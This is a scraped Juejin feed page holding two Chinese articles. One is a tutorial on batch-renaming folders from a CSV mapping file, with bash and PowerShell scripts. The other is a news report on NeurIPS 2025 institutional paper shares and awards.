tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述和构想</h2>
<p>笔者在工作中，遇到了一个需要批量对文件或者文件夹进行改名的操作需求。用户在日常工作中，积累了大量的工作文件，这些文件都按照原来的组织方式，放在很多文件夹中。但另一个业务需要将这些文件夹进行分类和再次组织，由于原有业务并没有考虑到这个要求，没有提供合适的编码和命名方式，就需要对这些文件夹按照新的组织方式进行重新进行重新命名操作。</p>
<p>当然小批量和单个的文件夹，可以使用手动完成(使用资源管理器或者命令行)。但如果考虑到如果有几千个这样的文件夹，手动操作的代价就非常繁琐了。更麻烦的是，如果更名的依据来自于业务需求，没有特定清晰的模式(如编码规则)，就更不好处理了。</p>
<p>为此，笔者在本文中提出并实现了一种批量的基于映射文件的操作方式。用户通过维护一个命名映射文件，并执行一个重命名脚本指令，就可以达成批量重命名文件夹的目的。</p>
<p>在实践过程中，笔者觉得这个需求和处理方案都比较有代表性，也是常见的系统运维工作，遂著文记录分享之。</p>
<h2 data-id="heading-1">映射文件</h2>
<p>到这里读者应该可以看到，这个模式的核心，就是这个映射文件，也可以理解成为控制文件。</p>
<p>笔者设计的映射文件的结构和示例如下：</p>
<pre><code class="hljs language-map.csv" lang="map.csv">
# 文件夹重命名映射表
# 格式：旧文件夹名称,新文件夹名称
# 注意：请确保旧文件夹在当前目录下存在

旧文件夹名,新文件夹名
成都七中,510100成都七中
达州一中,511700达州一中
temp_data,final_data_2024
2023_backup,archive_2023q4
client_raw_data,client_processed_data
development,production_ready
test_env,staging_environment
documents_2023,documentation_archive

</code></pre>
<p>就是简单的csv格式，逗号分隔。每个有效行包括旧文件夹和要命名的新文件夹名称。可以包括空行和注释行(#开头)，然后在代码中，忽略这些无效行的处理。</p>
<p>这个文件可以按照需要手动编辑，但最好的方式肯定是数据库查询后生成，所幸很多数据库管理工具都有可以直接基于查询结果生成和导出csv的功能。</p>
<h2 data-id="heading-2">Linux版本</h2>
<p>映射文件准备好了之后，就需要匹配的文件处理脚本来进行处理。基于方便使用和移植的考虑，这个脚本应该是一个操作系统可以直接内置支持的脚本程序，无需依赖外部执行环境和程序。</p>
<p>我们先以Linux系统为例，它的终端环境，本身就是一个可执行环境，默认的脚本执行程序就是如bash和sh这种程序，并使用配套的脚本，就可以在无外部依赖的情况下进行相关的文件操作和批量处理。</p>
<p>下面就是一个名为rnm.sh的bash脚本程序：</p>
<pre><code class="hljs language-rnm.sh" lang="rnm.sh">#!/bin/bash

# 脚本：rnm.sh
# 用法：./rnm.sh [map.csv]

if [ $# -ne 1 ]; then
    # echo "用法: $0 &lt;索引文件&gt;"
    # echo "索引文件格式: 旧文件夹名,新文件夹名"
    echo "使用默认索引 map.csv"
    INDEX_FILE="map.csv"
else
    INDEX_FILE="$1"
    echo "使用索引文件 $1"
fi

if [ ! -f "$INDEX_FILE" ]; then
    echo "索引文件 $INDEX_FILE 不存在 "
    exit 1
fi

# 读取索引文件并执行重命名
while IFS=',' read -r old_name new_name || [ -n "$old_name" ]; do
    # 去除可能的空格
    old_name=$(echo "$old_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    new_name=$(echo "$new_name" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')

    if [[ -z "$old_name"  ||  -z "$new_name"  || "$old_name" =~ ^# ]] ; then
        # echo "跳过空行和注释"
        continue
    fi

    if [ -d "$old_name" ]; then
        if [ ! -e "$new_name" ]; then
            echo "重命名: $old_name -&gt; $new_name"
            mv "$old_name" "$new_name"
        else
            echo "警告: 目标文件夹 $new_name 已存在，跳过 $old_name"
        fi
    else
        echo "警告: 源文件夹 $old_name 不存在"
    fi
done &lt; "$INDEX_FILE"

echo "重命名完成!"
</code></pre>
<p>配合前面的映射文件，相关的执行调用方式和处理结果如下：</p>
<pre><code class="hljs language-js" lang="js"> ./rnm.<span class="hljs-property">sh</span> 

使用默认索引map.<span class="hljs-property">csv</span>
跳过空行
跳过空行
警告: 源文件夹 旧文件夹名 不存在
重命名: 成都七中 -&gt; <span class="hljs-number">510100</span>成都七中
重命名: 达州一中 -&gt; <span class="hljs-number">511700</span>达州一中
警告: 源文件夹 temp_data 不存在
警告: 源文件夹 2023_backup 不存在
警告: 源文件夹 client_raw_data 不存在
警告: 源文件夹 development 不存在
警告: 源文件夹 test_env 不存在
警告: 源文件夹 documents_2023 不存在
重命名完成!

</code></pre>
<p>简单说明：</p>
<ul>
<li>脚本编写可以使用通用的文件处理程序，笔者直接使用vi</li>
<li>脚本编写完成后，需要赋予其执行权限( chmod a+x rnm.sh)</li>
<li>执行前，需要准备好要处理的文件夹，其上级文件夹作为工作文件夹</li>
<li>将脚本文件和映射文件都放在工作文件夹中</li>
<li>命令行的参数是可选的，可以指定使用特定的映射文件，否则会使用默认映射文件(map.csv)</li>
<li>程序自动忽略空行和注释行和错误格式信息</li>
<li>如果源文件夹不存在，提示错误信息</li>
<li>如果目标夹已存在，提示错误信息</li>
<li>正常处理，提示正常处理信息</li>
</ul>
<p>为了方便和效率，其实上面提供的代码，基本上都是AI生成的，但笔者的运气不太好，虽然大的框架没有问题，但实现中有一些细节进行了调整，所以看起来还没有到完全无懈可击的程度。当然，如果没有AI辅助，实现相关的工作，可能需要查询大量资料和进行更多的实验，确实更加低效和费时。</p>
<p>这里补充一下笔者所使用的提示词(使用的模型是deepseek-V3.1:671b)：</p>
<blockquote>
<p>请帮我在Linux系统上，编写一个sh脚本，可以按照一个索引map信息的内容，对当前目录中的文件夹进行批量改名</p>
</blockquote>
<h2 data-id="heading-3">Windows版本</h2>
<p>为了保存操作的通用性，利于类似的思路，笔者在Window系统上也实现了相应的版本。考虑到维护和使用的简便，同样实现的是命令行方式，使用相同的映射文件，但执行环境改成了PowerShell。使用方式一致。</p>
<p>下面是相关的PS脚本：</p>
<pre><code class="hljs language-rnm.ps1" lang="rnm.ps1"># 脚本：rnm.ps1
# 用法：.\rnm.ps1 [map.csv]

param(
    [string]$IndexFile = "map.csv"
)

# 设置控制台编码为UTF-8
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::InputEncoding  = [System.Text.Encoding]::UTF8
chcp 65001 &gt; $null

# 检查是否提供了参数
if ([string]::IsNullOrEmpty($IndexFile)) {
    $IndexFile = "map.csv"
    Write-Host "使用默认索引 map.csv"
} else {
    Write-Host "使用索引文件 $IndexFile"
}

# 检查索引文件是否存在
if (-not (Test-Path $IndexFile)) {
    Write-Host "索引文件 $IndexFile 不存在" -ForegroundColor Red
    exit 1
}

try {
    # 读取索引文件（指定UTF-8编码）
    $lines = Get-Content $IndexFile -Encoding UTF8
} catch {
    # 如果UTF-8失败，尝试默认编码
    $lines = Get-Content $IndexFile
}

# 处理CSV文件中的BOM（字节顺序标记）
if ($lines.Count -gt 0 -and $lines[0].StartsWith("ï»¿")) {
    $lines[0] = $lines[0].Substring(3)
}

# 读取索引文件并执行重命名
foreach ($line in $lines) {
    # 跳过空行和注释行（以#开头）
    if ([string]::IsNullOrWhiteSpace($line) -or $line.Trim().StartsWith("#")) {
        continue
    }
    
    # 按逗号分割行
    $parts = $line.Split(',', 2)
    
    if ($parts.Length -lt 2) {
        Write-Host "警告: 行格式不正确，跳过: $line" -ForegroundColor Yellow
        continue
    }
    
    # 去除空格
    $oldName = $parts[0].Trim()
    $newName = $parts[1].Trim()
    
    # 检查名称是否为空
    if ([string]::IsNullOrWhiteSpace($oldName) -or [string]::IsNullOrWhiteSpace($newName)) {
        Write-Host "警告: 旧名称或新名称为空，跳过: $line" -ForegroundColor Yellow
        continue
    }
    
    # 检查源文件夹是否存在
    if (Test-Path $oldName -PathType Container) {
        # 检查目标文件夹是否已存在
        if (-not (Test-Path $newName)) {
            Write-Host "重命名: $oldName -&gt; $newName" -ForegroundColor Green
            Rename-Item $oldName $newName
        } else {
            Write-Host "警告: 目标文件夹 $newName 已存在，跳过 $oldName" -ForegroundColor Yellow
        }
    } else {
        Write-Host "警告: 源文件夹 $oldName 不存在" -ForegroundColor Yellow
    }
}

Write-Host "重命名完成!" -ForegroundColor Green


</code></pre>
<p>简单说明：</p>
<ul>
<li>笔者使用notepad++来编辑这个脚本文件</li>
<li>可能需要赋予当前用户和环境执行脚本的权限(后详)</li>
<li>注意脚本文件的编码方式，必须是“UTF8-BOM”，否则会乱码</li>
<li>注意脚本中的字符集和PowerShell代码页的设置(chcp 65001 &gt; $null)</li>
<li>其他操作逻辑，基本上和Linux版本相同，具体实现的细节，都是匹配PS的</li>
</ul>
<p>这里有一些坑，就是PowerShell对于UTF8字符集的支持不是很好，很容易出现乱码，需要相关设置和配置。默认的编辑和存储方式是不行的。否则会出现下面的情况：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/381eb6d0c0234988853e01b82db9f0e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSm9obllhbg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765946707&amp;x-signature=z8xTo6O0euZfmQMa4ETP2BfLGzs%3D" alt="image.png" loading="lazy"/></p>
<p>还有就是运行中，可能遇到无法执行ps脚本程序的情况，需要为当前用户打开脚本执行权限：</p>
<blockquote>
<p>Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser</p>
</blockquote>
<h2 data-id="heading-4">扩展</h2>
<p>由于时间和场景的限制，本文只讨论的处理大批量子文件夹的情况，但显然实际的需求可能会更复杂一点。比如需要重命名文件，文件夹递归操作等等。但基本逻辑和操作都是一致的。无非就是在脚本中增加文件类型的判断，映射信息的补充等等，这里就不再展开了。</p>
<p>显然，本文提出的技术方案也是有通用性和可移植性的。用户也不需要再次编写程序，只需要维护映射文件，就可以进行满足业务需求的重命名操作。</p>
<h2 data-id="heading-5">小结</h2>
<p>本文通过笔者在工作中遇到的一个需要大批量对文件夹进行重命名的需求，探讨了一个基于映射文件的批量重命名处理的技术方案。探讨了其基本原理，映射文件的格式和生成方式，并提供了配套的可以在Linux系统和Window环境中允许的脚本程序。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[清华紧逼谷歌，AI顶会NeurIPS论文数第二！中国占半壁江山]]></title>    <link>https://juejin.cn/post/7581765536372703241</link>    <guid>https://juejin.cn/post/7581765536372703241</guid>    <pubDate>2025-12-10T03:07:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372703241" data-draft-id="7581760987762982963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="清华紧逼谷歌，AI顶会NeurIPS论文数第二！中国占半壁江山"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2025-12-10T03:07:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            清华紧逼谷歌，AI顶会NeurIPS论文数第二！中国占半壁江山
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:07:34.000Z" title="Wed Dec 10 2025 03:07:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72b5816ec9de4bd0b2575faca07e0c3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=XhreqZFFygrq8lX9Amk0HlmE%2FhY%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】NeurIPS 2025 见证了历史性的分流：清华大学以微弱差距逼近谷歌，中国 AI 完成了从数量堆叠向底层架构创新的「质变」突围。在圣地亚哥与墨西哥城的双会场之间，签证壁垒切割了物理空间。这是一场关于算力、人才与技术定义权的「双城记」。」</strong></h5>
<p>作为全球 AI 领域的年度最大学术盛事之一，今年的 NeurIPS 呈现出一种前所未有的撕裂感：一场会议，两个主场——一边是算力与资本的圣地硅谷的「后花园」，另一边则是由于签证壁垒而被迫形成的「平行宇宙」。</p>
<p>而在 OpenReview 滚动的录取名单背后，一个更具历史意味的转折点正在浮现：清华大学，这所中国最顶尖的学府，正以一种不可阻挡的态势逼近长期的霸主谷歌。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26b8b18347fa4acfbc45c8df12e50b82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=zqSAyi%2B%2FMsCbrFcUV%2BOTuGFBdKc%3D" alt="" loading="lazy"/></p>
<p>NeurIPS 2025 论文来源，图源：AIWorld</p>
<p>数字背后，是两个截然不同的科研生态系统在深水区的正面相遇。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c769d8e5cb094549ab883e19df2d5016~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=uPo3qEa1BB0%2FPkei3oPVT5HEe9A%3D" alt="" loading="lazy"/></p>
<p><strong>「谷歌还是第一」</strong></p>
<p><strong>「但清华即将追上」</strong></p>
<p>长期以来，NeurIPS 的接收榜单是硅谷巨头们的功勋墙。</p>
<p>谷歌、Meta、微软，这些名字代表了无限的算力、顶级薪资和对未来的定义权。</p>
<p>但 2025 年的数据表明，这一格局正在松动。</p>
<p>根据 AI World 的动态数据分析，在 NeurIPS 2025 接收的 5526 篇论文中，机构版图发生了剧烈震荡：</p>
<ul>
<li>中国占据了全球半壁江山的份额。</li>
<li>谷歌依然勉强维持着全球第一的份额，占据 4.84%。</li>
<li>清华大学以 4.73% 的份额紧随其后，两者差距缩小至仅 0.11%。</li>
<li>北京大学以 3.63% 并列第三。</li>
<li>传统计算机世界四大顶尖名校则分别为：斯坦福大学（2.58%）、卡内基梅隆大学（2.55%）、麻省理工学院（2.45%）、加州大学伯克利分校（2.08%）。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87184d16721e4e29b9ec5ebe70d905f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=jlBOs5pdB2IxdQUB9xL71x4OhKA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74ac74645a274350b381517b1de916ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=%2BWQ93MPTsTV7aikcN7MoY7skij4%3D" alt="" loading="lazy"/></p>
<p>图灵奖得主 Yann LeCun 也转发并发表了他的解读评论。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6f3f48dce7347c59cf8883e779c8212~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=lajNG%2B1ZAFGkZMI%2F0F1HM1K%2BeiI%3D" alt="" loading="lazy"/></p>
<p>这是一个极具象征意义的时刻。</p>
<p>在马拉松的最后冲刺阶段，领跑的硅谷巨头听到了身后沉重的呼吸声。</p>
<p>这种「高校包围巨头」的景象，揭示了中美科研生态的本质差异：</p>
<p>美国的 AI 创新高度集中在万亿市值的科技巨头手中，形成了算力与数据的垄断；</p>
<p>而中国的创新引擎则分布在顶尖高校与实验室之间，依靠极高的人才密度和政策驱动的资源倾斜，实现了惊人的爆发。</p>
<p>版图的切割线不再仅是国界，而是城市群。全球 AI 研究正在向三个核心枢纽收敛：北京、上海和旧金山湾区。</p>
<p>清华与北大的崛起是数十年基础教育投入的回响。</p>
<p>而旧金山湾区，尽管在数量上受到挑战，依然掌握着定义「下一个大事件」的话语权。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2618976291341bc8fa9ee43f5ce88ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=IG3JGb8X4fcYPApfTrNN9NnBmJA%3D" alt="" loading="lazy"/></p>
<p><strong>「质量突围」</strong></p>
<p><strong>「从「炼丹」到定义底层」</strong></p>
<p>过去，西方学界常带着有色眼镜审视中国 AI 论文，认为多为模型微调或应用层面的「灌水」。</p>
<p>然而，NeurIPS 2025 的获奖名单像是一记重锤，击碎了这种刻板印象。</p>
<p>数量的堆叠，终于在临界点引发了质变。</p>
<p>本届大会最受瞩目的最佳论文奖（Best Paper Award）之一，花落阿里千问团队。</p>
<p>这篇题为《Gated Attention for Large Language Models》的论文，对 Transformer 核心机制进行了一次手术刀式的革新。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f5a8f9f83aa4e8689d5e2e7397c919e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=B%2BUDhA8zPWpj4u1OK4ywzkRwIUs%3D" alt="" loading="lazy"/></p>
<p>在 LLM 推理成本高企的背景下，千问团队提出了一种带有非线性和稀疏性的门控注意力机制，不仅解决了长文本处理中的「注意力陷阱」，更大幅提升了模型效率。</p>
<p>中国科技公司不再满足于做开源模型的「搬运工」，而是开始涉足底层架构的定义权。</p>
<p>当千问的研究员站在领奖台上时，他们证明了中国工业界在基础研究上，已经具备了与 DeepMind 同台竞技的硬实力。</p>
<p>与此同时，时间检验奖（Test of Time Award）颁给了十年前的经典之作《Faster R-CNN》，作者是任少卿、何恺明、Ross Girshick、孙剑。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bbe6f758c444784851ed5a704fc5188~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=D3SbBR6aWZatWag7NTSN8lYm508%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5af92955e6724e0f8a07d26d85c23a31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=jfRmgU%2FWL8r9P3z6QzgtJEvECBM%3D" alt="" loading="lazy"/></p>
<p>这个奖项像是座灯塔，提醒世界：中国研究者的崛起并非朝夕之间。</p>
<p>早在深度学习爆发初期，以微软亚洲研究院为代表的「黄埔军校」，就已埋下了影响至今的种子。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fafbdcdc3154bec8c6ead0e3a91f4b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765940854&amp;x-signature=1dQM7D2U0DWtydHEPIJFhbgt4%2Fg%3D" alt="" loading="lazy"/></p>
<p><strong>「被撕裂的聚会」</strong></p>
<p><strong>「签证、卫星城与人才回流」</strong></p>
<p>NeurIPS 2025 的史诗感，更来自于它所处的时代背景。</p>
<p>这届大会被深深打上了地缘政治的烙印。</p>
<p>除了圣地亚哥的主会场，大会破天荒地在墨西哥城设立了平行卫星会场。</p>
<p>这是一种无奈的妥协。</p>
<p>对于许多涉及芯片设计、大模型安全等「敏感技术」的中国学者而言，获得美国签证已成为一场概率极低的赌博。</p>
<p>于是，墨西哥城成了连接两个世界的驿站。</p>
<p>虽然物理距离上与圣地亚哥仅一墙之隔，但这两场平行的会议仿佛隐喻了「两个 AI 生态」的未来。</p>
<p>曾经「孔雀东南飞」去往美国的顶尖华人大脑，正因美国科研环境的不确定性而选择回归。</p>
<p>清华等国内研究机构的爆发，很大程度上得益于这股回流潮。</p>
<p>这些机构提供了媲美硅谷的薪资、庞大的算力资源，以及更重要的——安全感。</p>
<p>参考资料：</p>
